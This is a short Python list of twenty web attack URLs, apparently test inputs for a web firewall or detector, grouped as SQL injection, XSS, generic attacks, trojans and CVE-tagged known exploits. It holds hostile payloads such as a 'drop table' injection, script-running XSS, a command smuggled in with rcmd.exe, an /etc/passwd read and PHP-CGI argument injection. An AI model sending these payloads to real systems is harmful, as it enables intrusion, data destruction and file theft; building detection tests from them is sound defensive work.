
# num=20
attack_url_list = ['/stacked?a = 1; drop table b;',                     # SBD SQL
                   '/embedded?a = 1 and (select * from b where 1=1)',
                   '/arithmetic?a = 1*1*1*1',
                   '/sqlfunction?a = MOD(x,y)',
                   '/lineComments',
                   '/tag?a=<input onfocus=write(1) autofocus>',         # SBD XSS
                   '/attribute?id=1 onload="alert(0)"',
                   '/css?a="style=-moz-binding:url(http://h4k.in/mozxss.xml#xss); a="',
                   '/jsfunction?a=function test(){A=alert;A(1)}',
                   '/jsVariable',
                   '/generic.php?id=1;rcmd.exe;echo',                   # Generic Attacks
                   '/trojans.php?act=encoder&d=%2Fvar%2Fwww%2F',        # Trojans
                   '/CVE-2022-1388/tm/util/bash?utilCmdArgs=-cid',    # Known Exploits
                   '/CVE-2015-7683/wp-content/plugins/font/AjaxProxy.php?url=/etc/passwd',
                   '/CVE-2014-5337/wp-content/plugins/wordpress-mobile-pack/export/content.php?content=exportarticle',
                   '/CVE-2012-1823/a.php?-dallow_url_include%3dOn+-dauto_prepend_file',
                   '/CVE-2009-2762/wp-login.php?action=rp&key[]=',
                   '/CVE-2008-6869/config/oramon.ini',
                   '/CVE-2006-1718/clevercopy_path/admin/connect.inc',
                   '/CVE-2000-0302/null.htw?CiWebHitsFile=vuln.asp%20']
